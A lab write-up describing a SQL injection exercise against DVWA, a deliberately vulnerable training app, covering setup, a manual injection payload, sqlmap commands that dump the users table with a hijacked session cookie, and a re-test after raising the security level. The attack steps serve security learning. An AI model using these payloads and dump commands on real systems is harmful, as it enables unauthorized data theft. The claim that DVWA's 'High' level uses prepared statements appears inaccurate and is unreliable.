SQL Injection Detection, Exploitation, and Patching Project
Author: Sean Johnson
 Environment: Kali Linux + Ubuntu VMs
 Target App: DVWA (Damn Vulnerable Web Application)
 Objective: Perform a full offensive and defensive cycle against a SQL Injection vulnerability using real-world tools and methodology.

Overview
This project simulates a real-world vulnerability lifecycle:
Setting up a vulnerable web application (DVWA)


Identifying and exploiting a SQL Injection vulnerability


Automating the attack with sqlmap


Troubleshooting sessions and HTTP behavior


Patching the vulnerability using secure coding practices


Verifying the patch is effective



Lab Environment
Role
System
Tools
Attacker
Kali Linux VM
sqlmap, curl, Firefox
Target
Ubuntu VM
Apache2, MySQL, DVWA (PHP app)


Phase 1: Vulnerable Environment Setup
DVWA Installation
On the Ubuntu VM:
sudo apt update
sudo apt install apache2 mysql-server php libapache2-mod-php php-mysql git
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
cd DVWA/config
sudo cp config.inc.php.dist config.inc.php

Edited config.inc.php:
$_DVWA['db_user'] = 'dvwauser';
$_DVWA['db_password'] = 'password';
$_DVWA['enable_phpids'] = false;
$_DVWA['disable_authentication_tokens'] = true;



MySQL Configuration
CREATE DATABASE dvwa;
CREATE USER 'dvwauser'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwauser'@'localhost';
FLUSH PRIVILEGES;



Final Steps
sudo systemctl restart apache2

Then visited http://<ubuntu-ip>/DVWA/setup.php and clicked "Create / Reset Database".

Phase 2: SQL Injection Detection & Exploitation
Manual Injection
Navigated to:
http://<ubuntu-ip>/DVWA/vulnerabilities/sqli/

Injected:
1' OR '1'='1

Result: Returned a list of users (vulnerable to SQLi)

Automated Exploitation Using sqlmap
Challenge: DVWA ties sessions to IPs — needed to log in from Kali browser and grab a valid PHPSESSID.
Tested session:
curl -IL --cookie "PHPSESSID=abc123; security=low" "http://<ip>/DVWA/vulnerabilities/sqli/?id=1"

Got HTTP/1.1 200 OK
Then ran:
sqlmap -u "http://<ip>/DVWA/vulnerabilities/sqli/?id=1" \
--cookie="PHPSESSID=abc123; security=low" \
--dbs --batch --flush-session

Output:
[*] dvwa
[*] information_schema

Then dumped users:
sqlmap -u "http://<ip>/DVWA/vulnerabilities/sqli/?id=1" \
--cookie="PHPSESSID=abc123; security=low" \
-D dvwa -T users --dump --batch --flush-session


Troubleshooting & Debugging Log
Issue
Fix
302 Redirect from DVWA
Ensured valid PHPSESSID by logging in from Kali
You have no declared cookies
Added --cookie header with both session + security
GET parameter Submit does not seem to be injectable
Ensured correct URL and that security level was low
Malformed input to a URL function
Corrected quotes and semicolon formatting in curl and sqlmap commands
sqlmap output not changing
Used --flush-session to force fresh scan


Phase 3: Patching the Vulnerability
Step 1: Elevated DVWA to “High” Security
DVWA → DVWA Security → Set to High → Submit
This updates the underlying PHP code to use prepared statements (PDO::prepare + bindParam), which prevents injection.

Step 2: Re-Test Injection
Manual input of 1' OR '1'='1 returned no data


sqlmap test returned:

 [WARNING] all tested parameters do not appear to be injectable.



Outcome
Phase
Result
Environment Setup
Success
SQL Injection (manual)
Confirmed vulnerability
sqlmap Exploitation
Data exfiltration completed
Patch via DVWA security
Effective — injection blocked
Re-test & Validation
Confirmed vulnerability resolved


Key Skills Demonstrated
Web app vulnerability analysis


Real-world penetration testing workflow


SQL injection attack methods and mitigation


Session hijacking and curl/http debugging


Use of automated tools (sqlmap)


Patch validation and secure coding awareness
